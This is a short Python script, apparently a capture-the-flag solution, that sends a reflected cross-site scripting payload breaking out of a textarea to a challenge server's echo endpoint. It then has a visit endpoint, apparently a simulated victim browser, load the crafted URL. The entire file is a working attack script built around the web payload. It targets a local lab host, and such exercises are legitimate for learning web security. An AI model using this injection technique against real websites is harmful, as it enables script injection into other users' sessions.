import requests

# Payload to break out of the textarea and inject the script
payload = '</textarea><script>alert("XSS");</script>'

y = requests.get("http://challenge.localhost:80/echo", params={'echo': payload})

x = requests.get("http://challenge.localhost:80/visit", params={'url': y.url})

print(x.content)
